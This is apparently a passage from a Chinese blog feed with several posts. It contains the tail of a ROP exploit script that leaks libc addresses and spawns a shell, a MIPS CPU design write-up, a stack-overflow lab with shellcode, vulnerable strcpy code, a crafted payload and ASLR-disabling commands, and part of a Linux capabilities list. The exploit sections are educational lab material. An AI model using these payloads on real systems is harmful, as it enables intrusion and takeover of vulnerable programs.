operator">+=</span> p64<span class="token punctuation">(</span>pppr<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>plt_write<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Enter input:"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"################ send payload1 ###########"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>writeAddrTmp <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>writeAddr <span class="token operator">=</span> writeAddrTmp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"writeAddr:"</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>writeAddr<span class="token punctuation">)</span>systemAddr <span class="token operator">=</span> <span class="token punctuation">(</span>writeAddr <span class="token operator">-</span> libc_write<span class="token punctuation">)</span> <span class="token operator">+</span> libc_system<span class="token keyword">print</span> <span class="token string">"systemAddr:"</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>systemAddr<span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> <span class="token punctuation">(</span>writeAddr <span class="token operator">-</span> libc_write<span class="token punctuation">)</span> <span class="token operator">+</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"binsh_addr:"</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">136</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pr<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>systemAddr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Enter input:"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"################ send payload2 ###########"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://jaq.alibaba.com/community/art/show?articleid=473">一步一步学ROP之linux_x64篇</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIPS CPU单周期设计</title>
      <link href="/2018/05/03/MIPS-CPU%E5%8D%95%E5%91%A8%E6%9C%9F%E8%AE%BE%E8%AE%A1/"/>
      <url>/2018/05/03/MIPS-CPU%E5%8D%95%E5%91%A8%E6%9C%9F%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本设计为计算机系统结构实验，写此文仅为总结。</p></blockquote><hr><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><ul><li><p>安装Xilinx ISE Design Suite 14.7</p></li><li><p>本设计使用Verilog HDL硬件描述语言，需熟悉其基本语法。  </p><span id="more"></span></li></ul><h2 id="2-设计总体要求"><a href="#2-设计总体要求" class="headerlink" title="2.设计总体要求"></a>2.设计总体要求</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="(1)概述"></a>(1)概述</h3><p>单周期（Single Cycle）CPU是指CPU从取出1条指令到执行完该指令只需1个时钟周期。<br><img src="/1-3-1.png"><br>一条指令的执行过程包括：取指令→分析指令→执行指令→保存结果（如果有的话）。对于单周期CPU来说，这些执行步骤均在一个时钟周期内完成。</p><h3 id="2-设计实现电路"><a href="#2-设计实现电路" class="headerlink" title="(2)设计实现电路"></a>(2)设计实现电路</h3><p><img src="/cpu.png"></p><h3 id="3-实现指令集"><a href="#3-实现指令集" class="headerlink" title="(3)实现指令集"></a>(3)实现指令集</h3><p>MIPS指令系统结构有MIPS-32和MIPS-64两种。本实验的MIPS指令选用MIPS-32。以下所说的MIPS指令均指MIPS-32。<br>MIPS的指令格式为32位。图3-3给出了MIPS指令的3种格式。</p><p><img src="/1-3-3.png"><br>本实验只选取了18条典型的MIPS指令来描述CPU逻辑电路的设计方法。表3-1列出了本实验的所涉及到的18条MIPS指令。<br><img src="/1-t-1.png"><br>Op和Op2为操作码；<br>shift保存要移位的位数；<br>rd、rs、rt分别为寄存器的寄存器号；<br>immediate保存立即数的低16位；<br>offset为偏移量；<br>address为转移地址的一部分。  </p><p>1、对于add&#x2F;sub&#x2F;mul&#x2F;and&#x2F;or&#x2F;xor  rd,rs,rt指令  &#x2F;&#x2F;rdrs  op  rt<br>其中rs和rt是两个源操作数的寄存器号，rd是目的寄存器号。</p><p>2、对于sll&#x2F;srl&#x2F;sra  rd,rt,shift 指令  &#x2F;&#x2F;rdrt  移动  shift位</p><p>3、对于addi&#x2F;muli  rt,rs,imm 指令  &#x2F;&#x2F;rtrs+imm(符号拓展)<br>rt是目的寄存器号，立即数要做符号拓展到32位。</p><p>4、对于andi&#x2F;ori&#x2F;xori  rt,rs,imm 指令  &#x2F;&#x2F;rtrs  op  imm(零拓展)<br>因为是逻辑指令，所以是零拓展。</p><p>5、对于load  rt,offset(rs)  指令  &#x2F;&#x2F;rt memory[rs+offset]<br>load是一条取存储器字的指令。寄存器rs的内容与符号拓展的offset想加，得到存储器地址。从存储器取来的数据存入rt寄存器。</p><p>6、对于store  rt,offset(rs)  指令  &#x2F;&#x2F; memory[rs+offset]  rt<br>store是一条存字指令。存储器地址的计算方法与load相同。</p><p>7、对于beq  rs,rt,label指令  &#x2F;&#x2F;if(rs&#x3D;&#x3D;rt)  PClabel<br>beq是一条条件转移指令。当寄存器rs内容与rt相等时，转移到label。如果程序计数器PC是beq的指令地址，则label&#x3D;PC+4+offset&lt;&lt;2。offset左移两位导致PC的最低两位永远是0，这是因为PC是字节地址，而一条指令要占4个字节。offset要进行符号拓展，因为beq能实现向前和向后两种转移。</p><p>8、bne指令去beq类似，但是是在寄存器rs内容与rt不相等时，转移到label。</p><p>9、对于jump  target指令  &#x2F;&#x2F;PCtarget<br>jump是一条跳转指令。target是转移的目标地址，32位，由3部分组成：最高4位来自于PC+4的高4位，中间26位是指令中的address，最低两位为0。</p><p>—————————————————————        未完待续—————————————————————————–</p>]]></content>
      
      
      <categories>
          
          <category> CPU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MIPS </tag>
            
            <tag> CPU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础栈溢出</title>
      <link href="/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><ul><li>理解掌握<code>C</code> 栈帧结构</li><li><code>Shellcode</code> 构造</li><li>加深理解栈溢出攻击原理及防护措施</li></ul><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><ul><li>在关闭安全机制下,在Linux系统平台上实现缓冲区溢出攻击</li><li>开启安全保护机制,运行一样的溢出攻击代码,比较实现现象</li></ul><span id="more"></span><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>​      <code>C</code> 栈帧结构如下：</p><p><img src="/%E9%80%89%E5%8C%BA_025.png" alt="区_02"></p><p>​         因此当当前帧的局部变量和临时变量超出区域，覆盖了<code>ebp</code> 和返回地址时，就实现了栈溢出攻击。再通过精心设计返回地址，使其为<code>Shellcode</code> 的起始地址，就完成了运行流的劫持。</p><p>​      实例基于 64位 <code>Ubuntu \ 16.04</code> 操作系统版本以及 <code>gcc,gdb</code> 版本信息如下：</p><pre class="line-numbers language-txt"><code class="language-txt">Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linuxgcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>Shellcode</code>  代码</li></ul><p>​       <code>Shellcode</code> 是一段攻击者精心设计的恶意代码，通常要求与位置无关，且本实验中利用 <code>strcpy()</code> 函数，因此<code>Shellcode</code>  代码中不能出现  <code>\x00</code> ，会被当作<code>\0</code>从而结束拷贝。</p><p>​       编写<code>Shellcode</code> ，该<code>shellcode</code> 调用<code>execve(&quot;/bin/sh&quot;,NULL)</code> ，启动一个新的<code>shell</code>，验证其功能，参考: <a href="https://www.exploit-db.com/exploits/36858/">https://www.exploit-db.com/exploits/36858/</a> ，编写汇编文件如下：</p><pre class="line-numbers language-asm"><code class="language-asm">.global _start_start:    # char *const argv[]    xorl %esi, %esi     # 'h' 's' '/' '/' 'n' 'i' 'b' '/'    movq `0x68732f2f6e69622f, %rbx     # for '\x00'    pushq %rsi    pushq %rbx    pushq %rsp        # const char *filename    popq %rdi     # __NR_execve 59    pushq `59    popq %rax     # char *const envp[]    xorl %edx, %edx    syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/%E9%80%89%E5%8C%BA_028.png" alt="区_02"></p><p>   提取机器码：</p><p><img src="/%E9%80%89%E5%8C%BA_029.png" alt="区_02"></p><ul><li>漏洞代码</li></ul><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">overflow</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"</span>                  <span class="token string">"\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span><span class="token punctuation">;</span>    <span class="token function">overflow</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​       上面这段程序栈溢出漏洞触发点在<code>strcpy</code>函数, 函数没有做边界检查，可导致栈溢出覆盖返回地址。成功利用栈溢出需要确定覆盖多少个字节可以覆盖到返回地址。因此在<code>gdb</code>调试时确定<code>shellcode</code>的地址即<code>str</code>复制后<code>buf</code>的首地址，让返回地址指向该地址。</p><ul><li><p>结果</p><p>为了更简单的方式实现栈溢出，需要关闭一些保护措施。</p></li></ul><ul><li><p><code>ASLR</code> (地址空间布局随机化)</p><p>关闭<code>ASLR</code>：<code>echo 0 |sudo tee /proc/sys/kernel/randomize_va_space</code></p></li><li><p><code>Cannary</code>  金丝雀</p><p>开启<code>Canary</code>之后，函数开始时在ebp和临时变量之间插入一个随机值，函数结束时验证这个值。如果不相等（也就是这个值被其他值覆盖了），就会调用 <code>_stackchk_fail</code>函数，终止进程。对应GCC编译选项<code>-fno-stack-protector</code>解除该保护。</p></li><li><p><code>NX</code><br>开启<code>NX</code>保护之后，程序的堆栈将会不可执行。对应GCC编译选项<code>-z execstack</code>解除该保护。</p></li></ul><p>编译调试：</p><p><img src="/%E9%80%89%E5%8C%BA_031.png" alt="区_03"></p><p>​       从调试结果可知，<code>buf</code> 的首地址为 <code>0x7fffffffdaa0</code> ，且查看内存该地址处确实为 <code>Shellcode</code> 起始代码。为了覆盖到返回地址，即填充字节至且包括8字节<code>rbp</code> (<code>0x7fffffffdac0</code>) ，则除了<code>shellcode</code>外还需要填充17字节。另外返回地址为<code>0x7fffffffdaa0</code>,改为小端模式<code>\xa0\xda\xff\xff\xff\x7f</code>。因此：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"</span>              <span class="token string">"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span>              <span class="token string">"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"</span>              <span class="token string">"\xa0\xda\xff\xff\xff\x7f\x00\x00"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​     重新编译，gdb调试运行：</p><p><img src="/%E9%80%89%E5%8C%BA_032.png" alt="区_03"></p><p> 成功运行。然而实际运行却是段错误，原因是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，因此只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。</p><p>获取<code>shellcode</code> 实际地址，可以打印出<code>buf</code> 地址，也可以利用内核转储获取真实地址。首先启用内核转储 <code>ulimit -c unlimited</code>  ，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p><p><img src="/%E9%80%89%E5%8C%BA_033.png" alt="区_03"></p><p>因此修改<code>str</code> 尾部为<code>\x10\xdb\xff\xff\xff\x7f\x00\x00</code>。重新编译运行：</p><p><img src="/%E9%80%89%E5%8C%BA_034.png" alt="区_03"></p><p>若启用保护措施，正常编译：</p><p><img src="/%E9%80%89%E5%8C%BA_035.png" alt="区_03"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 权能机制</title>
      <link href="/2018/05/01/Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/"/>
      <url>/2018/05/01/Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<ol><li><p><code>passwd​</code> ，  <code>sudo​</code> ， <code>ping​</code>  等命令会修改关键文件，确保非<code>root​</code> 用户无法修改，因此需要转换为<code>root​</code> 用户，而<code>setuid​</code> 位可以让用户暂时获得文件拥有者<code>root​</code> 的身份。</p><p>以<code>ping</code> 命令为例，删除<code>s</code> 位后无法<code>ping</code> ，因为没有打开<code>socket</code> 的权限。而当将<code>s</code> 位重新设置时，又可以<code>ping</code>  ：</p><span id="more"></span><p><img src="/setuid-ping.png" alt="选区_047"></p><p>为了执行权限检查，传统的 UNIX 实现区分两种类型的进程：特权进程（其有效用户 ID 为0，称为超级用户或 root），和非特权用户（其有效 UID 非0）。特权进程绕过所有的内核权限检查，而非特权进程受基于进程的认证信息（通常是：有效 UID，有效 GID，和补充组列表）的完整权限检查的支配。</p><p>自内核 2.2 版本开始，Linux 将传统上与超级用户关联的特权分为几个单元，称为 capabilities （权能），它们可以被独立的启用或禁用。权能是每个线程的属性。权能相当于规范了你这个程序所拥有的权限。相当于特权的需求的细化。当执行特权操作的时候，可以查看是否有相应的权能。</p><p><code>ping</code> 命令需要<code>CAP_NET_RAW</code>的权能，使用<code>setcap</code>为其添加权能：</p><p><img src="/%E9%80%89%E5%8C%BA_051.png" alt="选区_050"></p><p>可以<code>ping</code> ，且没有设置<code>uid</code> 位。</p></li><li><p>使用<code>man capabilities</code>  可以查看权能列表及相应的解释：</p></li></ol><ul><li><p><strong>CAP_AUDIT_CONTROL</strong>（自 Linux 2.6.11）<br>启用和禁用内核审计；修改审计过滤器规则；提取审计状态和过滤规则。</p></li><li><p><strong>CAP_AUDIT_READ</strong>（自 Linux 3.16）<br>允许通过一个多播 netlink socket 读取审计日志。</p></li><li><p><strong>CAP_AUDIT_WRITE</strong>（自 Linux 2.6.11）<br>向内核审计日志写记录。</p></li><li><p><strong>CAP_BLOCK_SUSPEND</strong>（自 Linux 3.5）<br>可以阻塞系统挂起（<strong>epoll</strong>(7) <strong>EPOLLWAKEUP</strong>，*&#x2F;proc&#x2F;sys&#x2F;wake_lock*）的特性。</p></li><li><p><strong>CAP_CHOWN</strong><br>对文件的 UIDs 和 GIDs 做任意的修改（参考 <strong>chown</strong>(2)）。</p></li><li><p><strong>CAP_DAC_OVERRIDE</strong><br>绕过文件的读，写，和执行权限检查。（DAC 是 “discretionary access control” 的缩写。）</p></li><li><p>CAP_DAC_READ_SEARCH</p><ul><li>绕过文件的读权限检查和目录的读和执行权限检查；</li><li>调用 <strong>open_by_handle_at</strong>(2)。</li></ul></li><li><p>CAP_FOWNER</p><ul><li>对于通常要求进程的文件系统 UID 与文件的 UID 匹配的操作，绕过权限检查 (比如，<strong>chmod</strong>(2)，<strong>utime</strong>(2))，除了那些包含在 <strong>CAP_DAC_OVERRIDE</strong> 和 <strong>CAP_DAC_READ_SEARCH</strong> 中的操作；</li><li>为任意文件设置扩展文件属性(参考 <strong>chattr</strong>(1))；</li><li>为任意文件设置访问控制表(ACLs)；</li><li>对文件删除操作忽略目录的 sticky 位；</li><li>在 <strong>open</strong>(2) 和 <strong>fcntl</strong>(2) 任意文件时设置 <strong>O_NOATIME</strong>。</li></ul></li><li><p><strong>CAP_FSETID</strong><br>当文件修改时不清除 set-user-ID 和 set-group-ID 模式位；为文件 GID 与调用进程的文件系统或补充 GIDs 不匹配的文件设置 set-group-ID 位。</p></li><li><p><strong>CAP_IPC_LOCK</strong><br>锁定内存 (<strong>mlock</strong>(2)，<strong>mlockall</strong>(2)，<strong>mmap</strong>(2)，<strong>shmctl</strong>(2))。</p></li><li><p><strong>CAP_IPC_OWNER</strong><br>绕过对 System V IPC 对象的操作的权限检查。</p></li><li><p><strong>CAP_KILL</strong><br>绕过发送信号 (参考 <strong>kill</strong>(2)) 时的权限检查。这包括使用 <strong>ioctl</strong>(2) <strong>KDSIGACCEPT</strong> 操作。</p></li><li><p><strong>CAP_LEASE</strong>（自 Linux 2.4）<br>为任意文件建立租约 (参考 <strong>fcntl</strong>(2))。</p></li><li><p><strong>CAP_LINUX_IMMUTABLE</strong><br>设置<strong>FS_APPEND_FL</strong> 和 <strong>FS_IMMUTABLE_FL</strong> inode 标记 (参考 <strong>chattr</strong>(1))。</p></li><li><p><strong>CAP_MAC_ADMIN</strong>（自 Linux 2.6.25）<br>覆盖强制访问控制 (Mandatory Access Control (MAC)). 为 Smack Linux 安全模块(Linux Security Module (LSM)) 而实现。</p></li><li><p><strong>CAP_MAC_OVERRIDE</strong>（自 Linux 2.6.25）<br>允许 MAC 配置或状态改变。为 Smack LSM 而实现。</p></li><li><p><strong>CAP_MKNOD</strong>（自 Linux 2.4）<br>使用 <strong>mknod</strong>(2) 创建特殊文件。</p></li><li><p>CAP_NET_ADMIN</p><p>执行多种网络有关的操作：</p><ul><li>接口配置；</li><li>IP 防火墙，地址伪装，和账单管理；</li><li>修改路由表；</li><li>为透明代理绑定任何地址；</li><li>设置服务类性 (type-of-service (TOS))；</li><li>清理驱动统计资料；</li><li>设置混杂模式；</li><li>启用组播；</li><li>使用 <strong>setsockopt</strong>(2) 设置下列 socket 选项：<strong>SO_DEBUG</strong>，<strong>SO_MARK</strong>，<strong>SO_PRIORITY</strong> (在0到6范围之外的优先级)，<strong>SO_RCVBUFFORCE</strong>，和 <strong>SO_SNDBUFFORCE</strong>。</li></ul></li><li><p><strong>CAP_NET_BIND_SERVICE</strong><br>将一个 socket 绑定到一个互联网域特权端口 (端口号小于 1024)。</p></li><li><p><strong>CAP_NET_BROADCAST</strong><br>(未使用) 使 socket 发送组播，并监听组播。</p></li><li><p>CAP_NET_RAW</p><ul><li>使用 RAW 和 PACKET sockets；</li><li>为透明代理绑定任何地址。</li></ul></li><li><p><strong>CAP_SETGID</strong><br>执行任意的进程 GIDs 和补充 GID 列表管理；当通过 UNIX 域 sockets 传递 socket 认证信息时伪造 GID；在一个用户命名空间 (参考 <strong>user_namespaces</strong>(7)) 中写入组 ID 映射。</p></li><li><p>CAP_SETFCAP (since Linux 2.6.24)<br>设置文件的权能。</p></li><li><p>CAP_SETPCAP</p><p>如果文件权能不受支持：授予或删除调用者功能设置位或来自任何其他进程的任何权能。 （当内核配置为支持文件功能时，CAP_SETPCAP的此属性不可用，因为CAP_SETPCAP对于这样的内核具有完全不同的语义。）</p><p>如果支持文件权能：从调用线程的边界集中添加任意权能到其可继承位;从边界集中删除权能（通过prctl（2）PR_CAPBSET_DROP）;<br>      对securebits标志进行更改。</p></li><li><p>CAP_SETUID</p></li><li><p>CAP_SYS_ADMIN</p><ul><li>执行一系列系统管理操作，包括：<strong>quotactl</strong>(2)，<strong>mount</strong>(2)，<strong>umount</strong>(2)，<strong>swapon</strong>(2)，<strong>swapoff</strong>(2)，<strong>sethostname</strong>(2)，和 <strong>setdomainname</strong>(2)；</li><li>执行特权 syslog(2) 操作 (自 Linux 2.6.37 开始，应该使用 CAP_SYSLOG 来允许这一操作)；</li><li>执行 <strong>VM86_REQUEST_IRQ vm86</strong>(2) 命令；</li><li>对任意 System V IPC 对象执行 IPC_SET 和 IPC_RMID 操作；</li><li>覆盖 RLIMIT_NPROC 资源限制；</li><li>执行 trusted 和 security Extended Attributes (see <strong>xattr</strong>(7)) 操作；</li><li>使用 <strong>lookup_dcookie</strong>(2)；</li><li>使用 ioprio_set(2) 来分配 IOPRIO_CLASS_RT 和 (Linux 2.6.25 之前) IOPRIO_CLASS_IDLE I&#x2F;O 调度类别；</li><li>当通过 UNIX 域 sockets 传递 socket 认证信息时伪装 PID；</li><li>在系统调用打开文件 (比如，<strong>accept</strong>(2)，<strong>execve</strong>(2)，<strong>open</strong>(2)，<strong>pipe</strong>(2)) 时，超出 &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;file-max，系统范围内打开文件数的限制；</li><li>通过 <strong>clone</strong>(2) 和 <strong>unshare</strong>(2) 使用 <strong>CLONE_*</strong> 标记创建新的命名空间（但是，自从 Linux 3.8 开始，创建命名空间不需要任何权能）；</li><li>调用 <strong>perf_event_open</strong>(2)；</li><li>访问特权 perf 事件信息；</li><li>调用 <strong>setns</strong>(2) (在目标命名空间中需要 CAP_SYS_ADMIN)；</li><li>调用 <strong>fanotify_init</strong>(2)；</li><li>调用 <strong>bpf</strong>(2)；</li><li>执行 <strong>KEYCTL_CHOWN</strong> 和 <strong>KEYCTL_SETPERM keyctl</strong>(2) 操作；</li><li>执行 <strong>madvise</strong>(2) <strong>MADV_HWPOISON</strong> 操作；</li><li>使用 <strong>TIOCSTI ioctl</strong>(2) 向一个终端的输入队列中插入字符，而不是调用者的控制终端；</li><li>使用废弃的 <strong>nfsservctl</strong> (2) 系统调用；</li><li>使用废弃的 <strong>bdflush</strong> (2) 系统调用；</li><li>执行各种特权的块设备 <strong>ioctl</strong>(2) 操作；</li><li>执行各种特权的文件系统 <strong>ioctl</strong>(2) 操作；</li><li>对许多设备驱动执行管理操作。</li></ul></li><li><p><strong>CAP_SYS_BOOT</strong><br>使用 <strong>reboot</strong>(2) 和 <strong>kexec_load</strong>(2)。</p></li><li><p><strong>CAP_SYS_CHROOT</strong><br>使用 <strong>chroot</strong>(2)。</p></li><li><p><strong>CAP_SYS_MODULE</strong><br>加载和卸载内核模块(参考 <strong>init_module</strong>(2) 和 <strong>delete_module</strong>(2))；在 2.6.25 之前的内核中：从系统范围内的权能边界集合中丢弃权能。</p></li><li><p>CAP_SYS_NICE</p><ul><li>触发进程 nice 值 (<strong>nice</strong>(2)，<strong>setpriority</strong>(2)) 和为任意进程改变 nice 值；</li><li>为调用进程设置实时调度策略，及为任意进程设置调度策略和优先级 (<strong>sched_setscheduler</strong>(2)，<strong>sched_setparam</strong>(2)，<strong>shed_setattr</strong>(2))；</li><li>为任意进程设置 CPU affinity (<strong>sched_setaffinity</strong>(2))；</li><li>为任意进程设置 I&#x2F;O 调度类别和优先级 (<strong>ioprio_set</strong>(2))；</li><li>对任意进程应用 <strong>migrate_pages</strong>(2) 并允许进程被迁移到任意节点；</li><li>对任意进程应用 <strong>move_pages</strong>(2)；</li><li>在 <strong>mbind</strong>(2) 和 <strong>move_pages</strong>(2) 中使用 <strong>MPOL_MF_MOVE_ALL</strong> 标记。</li></ul></li><li><p><strong>CAP_SYS_PACCT</strong><br>使用 <strong>acct</strong>(2)。</p></li><li><p>CAP_SYS_PTRACE</p><ul><li>使用 <strong>ptrace</strong>(2) 追踪任意进程；</li><li>对任意进程应用 <strong>get_robust_list</strong>(2)；</li><li>使用 <strong>process_vm_readv</strong>(2) 和 <strong>process_vm_writev</strong>(2) 同任意进程的内存传输数据；</li><li>使用 <strong>kcmp</strong>(2) 检查进程。</li></ul></li><li><p>CAP_SYS_RAWIO</p><ul><li>执行 I&#x2F;O 端口操作 (<strong>iopl</strong>(2) 和 <strong>ioperm</strong>(2))；</li><li>访问 &#x2F;proc&#x2F;kcore；</li><li>使用 <strong>FIBMAP ioctl</strong>(2) 操作；</li><li>打开设备访问 x86 模式特有寄存器 (MSRs，参考 <strong>msr</strong>(4))；</li><li>更新 &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;mmap_min_addr；</li><li>在地址低于 &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;mmap_min_addr 的位置创建内存映射；</li><li>在 &#x2F;proc&#x2F;bus&#x2F;pci 中映射文件；</li><li>打开 &#x2F;dev&#x2F;mem 和 &#x2F;dev&#x2F;kmem；</li><li>执行各种 SCSI 设备命令；</li><li>在 <strong>hpsa</strong>(4) 和 <strong>cciss</strong>(4) 设备上执行某一操作；</li><li>在其它设备上执行一系列设备特有操作。</li></ul></li><li><p>CAP_SYS_RESOURCE</p><ul><li>使用 ext2 文件系统上的预留空间；</li><li>执行 ioctl(2) 调用控制 ext3 日志；</li><li>覆盖磁盘配额限制；</li><li>增加资源限制 (参考 <strong>setrlimit</strong>(2))；</li><li>覆盖 RLIMIT_NPROC 资源限制；</li><li>在终端分配上覆盖最大的终端数；</li><li>覆盖最大的 keymaps 个数；</li><li>允许实时时钟中断大于64 hz；</li><li>触发一个 System V 消息队列的 msg_qbytes 限制超过 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;msgmnb 中的限制 (参考 <strong>msgop</strong>(2) 和 <strong>msgctl</strong>(2))；</li><li>当使用 <strong>F_SETPIPE_SZ fcntl</strong>(2) 命令设置一个管道的容量时覆盖 &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;pipe-size-max 的限制；</li><li>使用 <strong>F_SETPIPE_SZ</strong> 增加管道的容量超出 &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;pipe-max-size 指定的限制；</li><li>当创建 POSIX 消息队列 (参考 <strong>mq_overview</strong>(7)) 时覆盖 &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;mqueue&#x2F;queues_max 的限制；</li><li>使用 <strong>prctl</strong>(2) <strong>PR_SET_MM</strong> 